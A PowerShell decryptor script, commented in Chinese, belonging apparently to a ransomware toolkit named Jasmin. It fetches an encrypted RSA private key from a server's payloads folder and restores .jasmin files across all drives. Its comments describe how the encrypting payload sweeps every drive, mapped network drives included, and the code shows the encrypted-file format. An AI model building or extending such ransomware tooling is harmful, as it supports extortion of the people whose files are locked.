# ════════════════════════════════════════════════════════════════
# Jasmin Windows 一键解密器 — 纯 PowerShell 实现，无需编译 exe
#   要求: PowerShell 7.0+ (.NET 5+)
#         Windows 10/11 可用 `winget install Microsoft.PowerShell`
#
# 用法:
#   pwsh -File jasmin_unlock.ps1 -Server http://1.2.3.4:8080 -K <口令> [-Paths 目录...]
#
# 说明:
#   - 私钥以 AES-128-CBC 加密传输（与 PHP/Python 两端 keygen 统一）
#   - 仅需 .NET 内置密码学库，不依赖 openssl / python / exe
#   - 不指定 -Paths 时默认解密【全部】加密文件：
#     扫描所有固定磁盘 + 常用用户目录下的每一个 .jasmin
# ════════════════════════════════════════════════════════════════
#Requires -Version 7.0

param(
    [Parameter(Mandatory=$true)][string]$Server,
    [Parameter(Mandatory=$true)][string]$K,
    [string[]]$Paths
)

$ErrorActionPreference = 'Stop'
$Server = $Server.TrimEnd('/')

# 从网页复制 K 常带换行/空格（Windows 剪贴板还会带 CR/LF）。
# sh 版 (jasmin_unlock.sh) 早已剥掉这些，ps1 版此前没有 —— 粘错就报
# "K passphrase should be 32 hex chars"，与真实原因（复制噪声）不符。补齐一致性。
$K = $K.Trim()

if ($K.Length -ne 32) {
    Write-Host "[!] K passphrase should be 32 hex chars, got $($K.Length)" -ForegroundColor Red
    exit 1
}

if (-not $Paths -or $Paths.Count -eq 0) {
    # 未指定 => 解密全部加密文件（与载荷一致：载荷遍历所有磁盘）
    $Paths = @()
    # 所有固定磁盘
    foreach ($d in [System.IO.DriveInfo]::GetDrives()) {
        # 不加 DriveType 过滤：载荷遍历的是 DriveInfo.GetDrives() 且只看
        # IsReady，映射的网络盘同样会被加密。这里若只收 Fixed/Removable，
        # 网络盘上的加密文件在"解密全部"下就永远解不回来。
        if ($d.IsReady) {
            $Paths += $d.RootDirectory.FullName
        }
    }
    # 常用用户目录（载荷优先命中这里）
    $Paths += @(
        "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Pictures",
        "$env:USERPROFILE\Videos", "$env:USERPROFILE\Music",
        "$env:USERPROFILE\OneDrive", "$env:PUBLIC"
    )
    $Paths = $Paths | Where-Object { $_ -and (Test-Path -LiteralPath $_) } | Select-Object -Unique
    Write-Host "[*] No -Paths given - decrypting ALL encrypted files, scan scope:"
    foreach ($x in $Paths) { Write-Host "      $x" }
}

$td = Join-Path $env:TEMP ("jasmin_" + [guid]::NewGuid().ToString('N').Substring(0,8))
New-Item -ItemType Directory -Force -Path $td | Out-Null

try {
    # ── 1. 下载加密私钥 ──
    Write-Host "[*] Downloading encrypted private key..."
    Invoke-WebRequest -Uri "$Server/payloads/jasmin_private.pem.enc" -OutFile "$td/k.enc" -UseBasicParsing

    # ── 2. AES-128-CBC 解开私钥（key = K 的 16 字节 hex 解码） ──
    Write-Host "[*] Decrypting private key (AES-128-CBC)..."
    $raw = [Convert]::FromBase64String((Get-Content "$td/k.enc" -Raw))
    if ($raw.Length -le 16) { throw "Private key file content is malformed" }
    $iv = [byte[]]$raw[0..15]
    $ct = [byte[]]$raw[16..($raw.Length - 1)]

    $kb = [byte[]]::new(16)
    for ($i = 0; $i -lt 16; $i++) { $kb[$i] = [Convert]::ToByte($K.Substring($i * 2, 2), 16) }

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $kb; $aes.IV = $iv; $aes.Mode = 'CBC'; $aes.Padding = 'PKCS7'
    $dec = $aes.CreateDecryptor()
    # 必须 catch：K 不对时 PKCS7 去填充必失败并抛 CryptographicException，
    # 而外层 try 只有 finally、没有 catch —— 用户看到的是裸 .NET 堆栈，
    # 下面那句 "wrong K passphrase?" 根本到不了。
    try {
        $pem = $dec.TransformFinalBlock($ct, 0, $ct.Length)
    } catch {
        throw "Private key decryption failed - wrong K passphrase, or the .pem.enc is corrupt/replaced"
    }
    if ($pem.Length -lt 100) { throw "Private key decryption failed - wrong K passphrase, or the .pem.enc is corrupt/replaced" }

    $rsa = [System.Security.Cryptography.RSA]::Create()
    $rsa.ImportFromPem([System.Text.Encoding]::UTF8.GetString($pem))
    Write-Host "[+] Private key unlocked (RSA-$($rsa.KeySize))"

    # ── 3. 遍历解密 ──
    Write-Host "[*] Decrypting files..."
    $ok = 0; $fail = 0
    foreach ($p in $Paths) {
        if (-not (Test-Path -LiteralPath $p)) { Write-Host "[!] Path does not exist: $p" -ForegroundColor Yellow; continue }
        $files = Get-ChildItem -LiteralPath $p -Recurse -Filter '*.jasmin' -File -ErrorAction SilentlyContinue
        foreach ($item in $files) {
            $f = $item.FullName
            try {
                $b = [IO.File]::ReadAllBytes($f)
                if ($b.Length -lt 308) { throw "File too small ($($b.Length)B), likely corrupt" }

                # ★ 边界检查必须在 [int] 转换【之前】做完。
                # $ekLen 是 UInt32，一旦 >= 2^31（被篡改或损坏的文件），
                # [int]$ekLen 会先抛 OverflowException，下面那句
                # "Abnormal RSA key block length" 永远不可达，用户看到的是一串
                # 与真实原因无关的 .NET 堆栈。同样地本版此前缺 128 的下界
                # （sh 版有），ekLen=0 会退化成非法切片后才靠异常兜底。
                $ekLen = [BitConverter]::ToUInt32($b, $b.Length - 4)
                if ($ekLen -lt 128 -or $ekLen -gt 512 -or $ekLen -gt ($b.Length - 36)) {
                    throw "Abnormal RSA key block length ($ekLen)"
                }
                $ekOff = $b.Length - 4 - [int]$ekLen

                $sha   = [byte[]]$b[0..31]
                $cblob = [byte[]]$b[32..($ekOff - 1)]
                $ek    = [byte[]]$b[$ekOff..($b.Length - 5)]

                $km  = $rsa.Decrypt($ek, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
                $key = [byte[]]$km[0..31]
                $aiv = [byte[]]$km[32..47]

                $a = [System.Security.Cryptography.Aes]::Create()
                $a.Key = $key; $a.IV = $aiv; $a.Mode = 'CBC'; $a.Padding = 'PKCS7'
                $dd = $a.CreateDecryptor()
                $plain = $dd.TransformFinalBlock($cblob, 0, $cblob.Length)

                $h = [System.Security.Cryptography.SHA256]::HashData($plain)
                if (-not [System.Linq.Enumerable]::SequenceEqual([byte[]]$h, $sha)) {
                    throw "SHA256 verification failed (file tampered or wrong private key)"
                }

                [IO.File]::WriteAllBytes(($f -replace '\.jasmin$', ''), $plain)
                Remove-Item -LiteralPath $f -Force
                Write-Host "[+] $f"
                $ok++
            }
            catch {
                Write-Host "[!] $f : $($_.Exception.Message)" -ForegroundColor Yellow
                $fail++
            }
        }
    }

    Write-Host ""
    Write-Host "=== Done: $ok decrypted, $fail failed ==="
    if ($ok -eq 0 -and $fail -eq 0) {
        Write-Host "    No .jasmin files found. If they are in unusual locations, specify -Paths explicitly." -ForegroundColor Yellow
    }
    exit ([int]($fail -gt 0))
}
finally {
    Remove-Item -Recurse -Force $td -ErrorAction SilentlyContinue
    Write-Host "[+] Temporary files cleaned up"
}
